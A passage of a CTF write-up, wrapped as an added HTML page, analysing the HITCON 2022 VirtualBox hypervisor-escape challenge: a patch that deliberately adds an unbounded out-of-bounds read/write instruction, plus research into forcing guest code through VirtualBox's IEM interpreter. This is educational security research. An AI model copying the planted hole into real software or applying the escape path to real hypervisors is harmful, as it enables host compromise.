@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Fourchain - Hypervisor | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Fourchain - Hypervisor" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/HITCON-2022/pwn/fourchain-hv.html" />
+<meta property="og:url" content="https://org.anize.rs/HITCON-2022/pwn/fourchain-hv.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Fourchain - Hypervisor" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Fourchain - Hypervisor","url":"https://org.anize.rs/HITCON-2022/pwn/fourchain-hv.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="fourchain---hypervisor">Fourchain - Hypervisor</h1>
+
+<p><strong>Authors</strong>: <a href="https://twitter.com/busdma">busdma</a>, <a href="https://twitter.com/galli_leo_">gallileo</a></p>
+
+<p><strong>Tags</strong>: pwn, virtualbox</p>
+
+<p><strong>Points</strong>: 450</p>
+
+<blockquote>
+  <p>Welcome to the Virtualbox World~~</p>
+
+  <p>ssh -p 54321 vbox@104.197.76.244
+password: vbox</p>
+
+  <p>Resources are limited, please work on local first.
+Author: Billy</p>
+
+  <p>URLs
+https://storage.googleapis.com/hitconctf2022/hypervisor-575472edcd113e18e3939bd17c9416517f1646ec.zip</p>
+</blockquote>
+
+<h2 id="patch-analysis">Patch Analysis</h2>
+
+<p>The challenge author provided the following patch:</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h Chall/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h
+</span><span class="gd">--- VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h    2022-10-11 21:51:54.000000000 +0800
+</span><span class="gi">+++ Chall/src/VBox/VMM/VMMAll/IEMAllInstructions.cpp.h    2022-11-02 19:18:19.196674293 +0800
+</span><span class="p">@@ -20,7 +20,7 @@</span>
+ *   Global Variables                                                           *
+ *******************************************************************************/
+ extern const PFNIEMOP g_apfnOneByteMap[256]; /* not static since we need to forward declare it. */
+<span class="gd">-
+</span><span class="gi">+static uint64_t Table[0x10];
+</span> #ifdef _MSC_VER
+ # pragma warning(push)
+ # pragma warning(disable: 4702) /* Unreachable code like return in iemOp_Grp6_lldt. */
+<span class="p">@@ -538,6 +538,40 @@</span>
+     return IEMOP_RAISE_INVALID_OPCODE();
+ }
+ 
+<span class="gi">+FNIEMOP_DEF(iemOp_ReadTable)
++{
++    if (pVCpu-&gt;iem.s.enmCpuMode == IEMMODE_64BIT &amp;&amp; pVCpu-&gt;iem.s.uCpl == 0 )
++    {
++        IEM_MC_BEGIN(0, 2);
++        IEM_MC_LOCAL(uint64_t, u64Idx);
++        IEM_MC_FETCH_GREG_U64(u64Idx, X86_GREG_xBX);
++        IEM_MC_LOCAL_CONST(uint64_t, u64Value,/*=*/ Table[u64Idx]);
++        IEM_MC_STORE_GREG_U64(X86_GREG_xAX, u64Value);
++        IEM_MC_ADVANCE_RIP();
++        IEM_MC_END();
++        return VINF_SUCCESS;
++    }
++    return IEMOP_RAISE_INVALID_OPCODE();
++}
++
++
++FNIEMOP_DEF(iemOp_WriteTable)
++{
++    if (pVCpu-&gt;iem.s.enmCpuMode == IEMMODE_64BIT &amp;&amp; pVCpu-&gt;iem.s.uCpl == 0 )
++    {
++        IEM_MC_BEGIN(0, 2);
++        IEM_MC_LOCAL(uint64_t, u64Idx);
++        IEM_MC_FETCH_GREG_U64(u64Idx, X86_GREG_xBX);
++        IEM_MC_LOCAL(uint64_t, u64Value);
++        IEM_MC_FETCH_GREG_U64(u64Value, X86_GREG_xAX);
++        Table[u64Idx] = u64Value;
++        IEM_MC_ADVANCE_RIP();
++        IEM_MC_END();
++        return VINF_SUCCESS;
++    }
++    return IEMOP_RAISE_INVALID_OPCODE();
++}
++
+</span> 
+ /** Invalid with RM byte . */
+ FNIEMOPRM_DEF(iemOp_InvalidWithRM)
+<span class="gh">diff -Naur VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h Chall/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h
+</span><span class="gd">--- VirtualBox-6.1.40/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h    2022-10-11 21:51:55.000000000 +0800
+</span><span class="gi">+++ Chall/src/VBox/VMM/VMMAll/IEMAllInstructionsTwoByte0f.cpp.h    2022-11-02 16:18:35.752320732 +0800
+</span><span class="p">@@ -9539,9 +9539,9 @@</span>
+     /* 0x22 */  iemOp_mov_Cd_Rd,            iemOp_mov_Cd_Rd,            iemOp_mov_Cd_Rd,            iemOp_mov_Cd_Rd,
+     /* 0x23 */  iemOp_mov_Dd_Rd,            iemOp_mov_Dd_Rd,            iemOp_mov_Dd_Rd,            iemOp_mov_Dd_Rd,
+     /* 0x24 */  iemOp_mov_Rd_Td,            iemOp_mov_Rd_Td,            iemOp_mov_Rd_Td,            iemOp_mov_Rd_Td,
+<span class="gd">-    /* 0x25 */  iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,
+</span><span class="gi">+    /* 0x25 */  iemOp_ReadTable,            iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,
+</span>     /* 0x26 */  iemOp_mov_Td_Rd,            iemOp_mov_Td_Rd,            iemOp_mov_Td_Rd,            iemOp_mov_Td_Rd,
+<span class="gd">-    /* 0x27 */  iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,
+</span><span class="gi">+    /* 0x27 */  iemOp_WriteTable,           iemOp_Invalid,              iemOp_Invalid,              iemOp_Invalid,
+</span>     /* 0x28 */  iemOp_movaps_Vps_Wps,       iemOp_movapd_Vpd_Wpd,       iemOp_InvalidNeedRM,        iemOp_InvalidNeedRM,
+     /* 0x29 */  iemOp_movaps_Wps_Vps,       iemOp_movapd_Wpd_Vpd,       iemOp_InvalidNeedRM,        iemOp_InvalidNeedRM,
+     /* 0x2a */  iemOp_cvtpi2ps_Vps_Qpi,     iemOp_cvtpi2pd_Vpd_Qpi,     iemOp_cvtsi2ss_Vss_Ey,      iemOp_cvtsi2sd_Vsd_Ey,
+</code></pre></div></div>
+
+<p>The patch adds a global uint64_t array <code class="language-plaintext highlighter-rouge">Table</code> and two new instructions to the two-byte IEM opcode map. 
+The <code class="language-plaintext highlighter-rouge">ReadTable</code> instruction (opcode <code class="language-plaintext highlighter-rouge">0x0f 0x25</code>) reads a 64-bit value from the array (<code class="language-plaintext highlighter-rouge">RAX := Table[RBX];</code>). The <code class="language-plaintext highlighter-rouge">WriteTable</code> instruction (opcode <code class="language-plaintext highlighter-rouge">0x0f 0x27</code>) writes a 64-bit value to the array (<code class="language-plaintext highlighter-rouge">Table[RBX] := RAX;</code>). Both instructions are only allowed to execute in 64-bit mode and when CPL is 0 (ring zero/kernel).
+The <code class="language-plaintext highlighter-rouge">Table</code> indexing is not bounded. This provides us with an <strong>Out-Of-Bounds read and write primitive</strong>, relative to <code class="language-plaintext highlighter-rouge">Table</code>.</p>
+
+<h2 id="of-the-virtualbox-architecture">Of the VirtualBox Architecture</h2>
+
+<p>Unsurprisingly, VirtualBox is made up of many different components. This section contains a brief description of the components relevant to this writeup. VirtualBox aficionados can most likely skip this part.</p>
+
+<p>Virtualbox defines several execution contexts, the main ones being Guest Context (GC) and Host Context (HC).</p>
+
+<p><img src="/HITCON-2022/pwn/img/vbox_arch.svg" alt="VirtualBox Architecture" /></p>
+
+<p>The core of VirtualBox (i.e. the VMM, Virtual Machine Monitor) runs in HC, under the host operating system. The guest, our entrypoint for this challenge, runs in the GC. Since the added instructions are valid only when the virtual CPU has a CPL of 0, a kernel module must be prepared and inserted into the guest kernel. This is feasible, we have quasi-complete control over the guest.</p>
+
+<p>The HC VMM code has a kernel (R0) and a user (R3) part. This split can also be seen in the source code structure: the VMM folder has a VMMR0 and VMMR3 folder for the kernel and user part, respectively. The VMMAll folder contains code common to both.<br />
+Execution of a VM starts in the R3 Execution Monitor (EM) component, with a call to the <code class="language-plaintext highlighter-rouge">EMR3ExecuteVM</code> function. The description of the EM component is interesting:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> * The Execution Monitor/Manager is responsible for running the VM, scheduling
+ * the right kind of execution (Raw-mode, Hardware Assisted, Recompiled or
+ * Interpreted), and keeping the CPU states in sync. The function
+ * EMR3ExecuteVM() is the 'main-loop' of the VM, while each of the execution
+ * modes has different inner loops (emR3RawExecute, emR3HmExecute, and
+ * emR3RemExecute).
+ *
+ * The interpreted execution is only used to avoid switching between
+ * raw-mode/hm and the recompiler when fielding virtualization traps/faults.
+ * The interpretation is thus implemented as part of EM.
+</code></pre></div></div>
+
+<p>This tells us that there are multiple execution modes, one of which is called the Interpreted mode. Indeed, this corresponds to the IEM component, for which the patch adds the two new instructions. Unfortunately, the challenge runs on an Intel CPU with VMX support, meaning that our code is de facto being scheduled for Hardware Assisted execution, the HM component. This means that we somehow must coax the EM into scheduling our code for execution by the IEM.</p>
+
+<p>Thus began a long and painful journey to <del>Mount Doom</del> IEM.</p>
+
+<h2 id="of-the-iem-arbitrary-instruction-execution">Of The IEM: Arbitrary Instruction Execution</h2>
+
+<p>Eventually, the R3 EM code will schedule the guest code for execution with an IOCTL request to the R0 component. The R0 entry point function is <code class="language-plaintext highlighter-rouge">VMMR0EntryFast</code>, where the <code class="language-plaintext highlighter-rouge">VMMR0_DO_HM_RUN</code> will loop execution of the guest code until halted. 
+After delving a bit deeper and greedier (for flags), we end up at <code class="language-plaintext highlighter-rouge">hmR0VmxRunGuestCodeNormal</code>. This function has another loop, in which <code class="language-plaintext highlighter-rouge">hmR0VmxRunGuest</code> is called to execute guest code in VT-x. More interestingly, the loop also handles VM exits. Upon VM exit, the current vCPU state is dispatched to the proper handler by indexing the global <code class="language-plaintext highlighter-rouge">g_apfnVMExitHandlers</code> function table.</p>
+
+<p>At this point we assumed that getting to IEM would probably involve triggering a VM exit and some sorcery. Let’s take a look at IEM’s description:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> * The interpreted exeuction manager (IEM) is for executing short guest code
+ * sequences that are causing too many exits / virtualization traps.  It will
+ * also be used to interpret single instructions, thus replacing the selective
+ * interpreters in EM and IOM.
+</code></pre></div></div>
+
+<p>According to the description, causing many VM exits could potentially reschedule us to IEM mode and execute a short sequence of instructions. This sounded perfect for our usecase. Let’s take a look at the CPUID handler <code class="language-plaintext highlighter-rouge">hmR0VmxExitCpuid</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
+ * VM-exit handler for CPUID (VMX_EXIT_CPUID). Unconditional VM-exit.
+ */</span>
+<span class="n">HMVMX_EXIT_DECL</span> <span class="nf">hmR0VmxExitCpuid</span><span class="p">(</span><span class="n">PVMCPUCC</span> <span class="n">pVCpu</span><span class="p">,</span> <span class="n">PVMXTRANSIENT</span> <span class="n">pVmxTransient</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+     <span class="cm">/*
+     * Get the state we need and update the exit history entry.
+     */</span>
+    <span class="p">...</span>
+
+    <span class="n">VBOXSTRICTRC</span> <span class="n">rcStrict</span><span class="p">;</span>
+    <span class="n">PCEMEXITREC</span> <span class="n">pExitRec</span> <span class="o">=</span> <span class="n">EMHistoryUpdateFlagsAndTypeAndPC</span><span class="p">(</span><span class="n">pVCpu</span><span class="p">,</span>
+                                                            <span class="n">EMEXIT_MAKE_FT</span><span class="p">(</span><span class="n">EMEXIT_F_KIND_EM</span> <span class="o">|</span> <span class="n">EMEXIT_F_HM</span><span class="p">,</span> <span class="n">EMEXITTYPE_CPUID</span><span class="p">),</span>
+                                                            <span class="n">pVCpu</span><span class="o">-&gt;</span><span class="n">cpum</span><span class="p">.</span><span class="n">GstCtx</span><span class="p">.</span><span class="n">rip</span> <span class="o">+</span> <span class="n">pVCpu</span><span class="o">-&gt;</span><span class="n">cpum</span><span class="p">.</span><span class="n">GstCtx</span><span class="p">.</span><span class="n">cs</span><span class="p">.</span><span class="n">u64Base</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pExitRec</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="cm">/*
+         * Regular CPUID instruction execution.
+         */</span>
+         <span class="p">...</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="cm">/*
+         * Frequent exit or something needing probing.  Get state and call EMHistoryExec.
+         */</span>
+        <span class="kt">int</span> <span class="n">rc2</span> <span class="o">=</span> <span class="n">hmR0VmxImportGuestState</span><span class="p">(</span><span class="n">pVCpu</span><span class="p">,</span> <span class="n">pVmcsInfo</span><span class="p">,</span> <span class="n">HMVMX_CPUMCTX_EXTRN_ALL</span><span class="p">);</span>
+        <span class="n">AssertRCReturn</span><span class="p">(</span><span class="n">rc2</span><span class="p">,</span> <span class="n">rc2</span><span class="p">);</span>
+
+        <span class="n">Log4</span><span class="p">((</span><span class="s">"CpuIdExit/%u: %04x:%08RX64: %#x/%#x -&gt; EMHistoryExec</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+              <span class="n">pVCpu</span><span class="o">-&gt;</span><span class="n">idCpu</span><span class="p">,</span> <span class="n">pVCpu</span><span class="o">-&gt;</span><span class="n">cpum</span><span class="p">.</span><span class="n">GstCtx</span><span class="p">.</span><span class="n">cs</span><span class="p">.</span><span class="n">Sel</span><span class="p">,</span> <span class="n">pVCpu</span><span class="o">-&gt;</span><span class="n">cpum</span><span class="p">.</span><span class="n">GstCtx</span><span class="p">.</span><span class="n">rip</span><span class="p">,</span> <span class="n">pVCpu</span><span class="o">-&gt;</span><span class="n">cpum</span><span class="p">.</span><span class="n">GstCtx</span><span class="p">.</span><span class="n">eax</span><span class="p">,</span> <span class="n">pVCpu</span><span class="o">-&gt;</span><span class="n">cpum</span><span class="p">.</span><span class="n">GstCtx</span><span class="p">.</span><span class="n">ecx</span><span class="p">));</span>
+
+        <span class="n">rcStrict</span> <span class="o">=</span> <span class="n">EMHistoryExec</span><span class="p">(</span><span class="n">pVCpu</span><span class="p">,</span> <span class="n">pExitRec</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="p">...</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">EMHistoryUpdateFlagsAndTypeAndPC</code> is doing the bookkeeping, <code class="language-plaintext highlighter-rouge">IEMExecForExits</code> is called when a certain threshold (256) of VM exits is reached. <code class="language-plaintext highlighter-rouge">IEMExecForExits</code> will internally execute a block (4096) of instructions in IEM by calling <code class="language-plaintext highlighter-rouge">IEMExecForExits</code>. This seemed very promising, consequently a lot of time was spent here trying to get this to work.<br />
+Unfortunately, it seems that internally the <code class="language-plaintext highlighter-rouge">EMHistoryUpdateFlagsAndTypeAndPC</code> is effectively disabled when coming from HM mode. This spelled the end of our “optimizing into IEM” saga. Lots of other VM exit handlers were tested, however none of them yielded any success.</p>
+
+<p>When trying to trace back under which other circumstances <code class="language-plaintext highlighter-rouge">iemExecOneInner</code> would be called, I noticed the following:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="cm">/*
+         * Memory mapped I/O access - emulate the instruction.
+         */</span>
+        <span class="k">case</span> <span class="n">VINF_IOM_R3_MMIO_READ</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">VINF_IOM_R3_MMIO_WRITE</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">VINF_IOM_R3_MMIO_READ_WRITE</span><span class="p">:</span>
+            <span class="n">rc</span> <span class="o">=</span> <span class="n">emR3ExecuteInstruction</span><span class="p">(</span><span class="n">pVM</span><span class="p">,</span> <span class="n">pVCpu</span><span class="p">,</span> <span class="s">"MMIO"</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>For your information, when accessing MMIO the guest will VM exit with <code class="language-plaintext highlighter-rouge">VMX_EXIT_EPT_MISCONFIG</code> as reason. Sometimes, the kernel code will return to R3 code and return from <code class="language-plaintext highlighter-rouge">VMMR3HmRunGC</code> with return value <code class="language-plaintext highlighter-rouge">VINF_IOM_R3_MMIO_READ</code>. The MMIO access is then handled by <code class="language-plaintext highlighter-rouge">emR3HmHandleRC</code> (excerpt seen above), which will call <code class="language-plaintext highlighter-rouge">iemExecOne/iemExecOneInner</code>.</p>
+
+<p>I then searched for <code class="language-plaintext highlighter-rouge">VINF_IOM_R3_MMIO_READ</code> in the codebase and found that it was used in the code for implementing MMIO for the E1000 network card, which was fortunately used for the VM:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
+ * Read handler for EEPROM/Flash Control/Data register.
+ *
+ * Lower 4 bits come from EEPROM device if EEPROM access has been granted.
+ *
+ * @returns VBox status code.
+ *
+ * @param   pThis       The device state structure.
+ * @param   offset      Register offset in memory-mapped frame.
+ * @param   index       Register index in register array.
+ * @param   mask        Used to implement partial reads (8 and 16-bit).
+ * @thread  EMT
+ */</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">e1kRegReadEECD</span><span class="p">(</span><span class="n">PPDMDEVINS</span> <span class="n">pDevIns</span><span class="p">,</span> <span class="n">PE1KSTATE</span> <span class="n">pThis</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">index</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">pu32Value</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="cp">#ifdef IN_RING3
+</span>    <span class="kt">uint32_t</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="cm">/* Get rid of false positive in parfait. */</span>
+    <span class="kt">int</span>      <span class="n">rc</span> <span class="o">=</span> <span class="n">e1kRegReadDefault</span><span class="p">(</span><span class="n">pDevIns</span><span class="p">,</span> <span class="n">pThis</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">RT_SUCCESS</span><span class="p">(</span><span class="n">rc</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">value</span> <span class="o">&amp;</span> <span class="n">EECD_EE_GNT</span><span class="p">)</span> <span class="o">||</span> <span class="n">pThis</span><span class="o">-&gt;</span><span class="n">eChip</span> <span class="o">==</span> <span class="n">E1K_CHIP_82543GC</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="cm">/* Note: 82543GC does not need to request EEPROM access */</span>
+            <span class="cm">/* Access to EEPROM granted -- get 4-wire bits to EEPROM device */</span>
+            <span class="n">STAM_PROFILE_ADV_START</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pThis</span><span class="o">-&gt;</span><span class="n">StatEEPROMRead</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+            <span class="n">PE1KSTATECC</span> <span class="n">pThisCC</span> <span class="o">=</span> <span class="n">PDMDEVINS_2_DATA_CC</span><span class="p">(</span><span class="n">pDevIns</span><span class="p">,</span> <span class="n">PE1KSTATECC</span><span class="p">);</span>
+            <span class="n">value</span> <span class="o">|=</span> <span class="n">pThisCC</span><span class="o">-&gt;</span><span class="n">eeprom</span><span class="p">.</span><span class="n">read</span><span class="p">();</span>
+            <span class="n">STAM_PROFILE_ADV_STOP</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pThis</span><span class="o">-&gt;</span><span class="n">StatEEPROMRead</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="o">*</span><span class="n">pu32Value</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">rc</span><span class="p">;</span>
+<span class="cp">#else </span><span class="cm">/* !IN_RING3 */</span><span class="cp">
+</span>    <span class="n">RT_NOREF_PV</span><span class="p">(</span><span class="n">pDevIns</span><span class="p">);</span> <span class="n">RT_NOREF_PV</span><span class="p">(</span><span class="n">pThis</span><span class="p">);</span> <span class="n">RT_NOREF_PV</span><span class="p">(</span><span class="n">offset</span><span class="p">);</span> <span class="n">RT_NOREF_PV</span><span class="p">(</span><span class="n">index</span><span class="p">);</span> <span class="n">RT_NOREF_PV</span><span class="p">(</span><span class="n">pu32Value</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">VINF_IOM_R3_MMIO_READ</span><span class="p">;</span>
+<span class="cp">#endif </span><span class="cm">/* !IN_RING3 */</span><span class="cp">
+</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>In particular, it looks like if we are currently executing in R0 (which we are by default after a VM exit), then it would return <code class="language-plaintext highlighter-rouge">VINF_IOM_R3_MMIO_READ</code>, and hence return to R3 and execute the instruction responsible for the EECD MMIO read to be emulated.
+The specific register which this function is a callback for, is at <code class="language-plaintext highlighter-rouge">+0x10</code> of the E1000 MMIO base.</p>
+
+<p>Alone, this would have not helped much, since it turns out to still only emulate exactly one instruction.
+However, we thought maybe now too many VM exits would lead to more instructions being emulated.
+Unfortunately, we still could not get that part to work.</p>
+
+<p>While scouring through the IEM code, the description of <code class="language-plaintext highlighter-rouge">iemExecOneInner</code> seemed interesting:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ * @return  Strict VBox status code.
+ * @param   pVCpu       The cross context virtual CPU structure of the calling EMT.
+ * @param   fExecuteInhibit     If set, execute the instruction following CLI,
+ *                      POP SS and MOV SS,GR.
+ * @param   pszFunction The calling function name.
+ */</span>
+<span class="n">DECLINLINE</span><span class="p">(</span><span class="n">VBOXSTRICTRC</span><span class="p">)</span> <span class="n">iemExecOneInner</span><span class="p">(</span><span class="n">PVMCPUCC</span> <span class="n">pVCpu</span><span class="p">,</span> <span class="n">bool</span> <span class="n">fExecuteInhibit</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pszFunction</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>If the <code class="language-plaintext highlighter-rouge">fExecuteInhibit</code> flag is set, the instruction following a <code class="language-plaintext highlighter-rouge">cli</code>, <code class="language-plaintext highlighter-rouge">pop ss</code> or <code class="language-plaintext highlighter-rouge">mov ss, reg</code> instruction is executed. What if we place our target instruction right after?<br />
+By default, these instructions do not cause a VM exit, they are executed like other normal instructions in HM. Looking into the <code class="language-plaintext highlighter-rouge">mov ss, reg</code> implementation in IEM, it seemed that loading from memory is also supported:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**
+ * @opcode      0x8e
+ */</span>
+<span class="n">FNIEMOP_DEF</span><span class="p">(</span><span class="n">iemOp_mov_Sw_Ev</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">IEMOP_MNEMONIC</span><span class="p">(</span><span class="n">mov_Sw_Ev</span><span class="p">,</span> <span class="s">"mov Sw,Ev"</span><span class="p">);</span>
+
+    <span class="kt">uint8_t</span> <span class="n">bRm</span><span class="p">;</span> <span class="n">IEM_OPCODE_GET_NEXT_U8</span><span class="p">(</span><span class="o">&amp;</span><span class="n">bRm</span><span class="p">);</span>
+    <span class="p">...</span>
+
+    <span class="cm">/*
+     * If rm is denoting a register, no more instruction bytes.
+     */</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">bRm</span> <span class="o">&amp;</span> <span class="n">X86_MODRM_MOD_MASK</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&lt;&lt;</span> <span class="n">X86_MODRM_MOD_SHIFT</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="p">...</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="cm">/*
+         * We're loading the register from memory.  The access is word sized
+         * regardless of operand size prefixes.
+         */</span>
+        <span class="n">IEM_MC_BEGIN</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="n">IEM_MC_ARG_CONST</span><span class="p">(</span><span class="kt">uint8_t</span><span class="p">,</span> <span class="n">iSRegArg</span><span class="p">,</span> <span class="n">iSegReg</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="n">IEM_MC_ARG</span><span class="p">(</span><span class="kt">uint16_t</span><span class="p">,</span>      <span class="n">u16Value</span><span class="p">,</span>          <span class="mi">1</span><span class="p">);</span>
+        <span class="n">IEM_MC_LOCAL</span><span class="p">(</span><span class="n">RTGCPTR</span><span class="p">,</span> <span class="n">GCPtrEffDst</span><span class="p">);</span>
+        <span class="n">IEM_MC_CALC_RM_EFF_ADDR</span><span class="p">(</span><span class="n">GCPtrEffDst</span><span class="p">,</span> <span class="n">bRm</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="n">IEMOP_HLP_DONE_DECODING_NO_LOCK_PREFIX</span><span class="p">();</span>
+        <span class="n">IEM_MC_FETCH_MEM_U16</span><span class="p">(</span><span class="n">u16Value</span><span class="p">,</span> <span class="n">pVCpu</span><span class="o">-&gt;</span><span class="n">iem</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="n">iEffSeg</span><span class="p">,</span> <span class="n">GCPtrEffDst</span><span class="p">);</span>
+        <span class="n">IEM_MC_CALL_CIMPL_2</span><span class="p">(</span><span class="n">iemCImpl_load_SReg</span><span class="p">,</span> <span class="n">iSRegArg</span><span class="p">,</span> <span class="n">u16Value</span><span class="p">);</span>
+        <span class="n">IEM_MC_END</span><span class="p">();</span>
+    <span class="p">}</span>
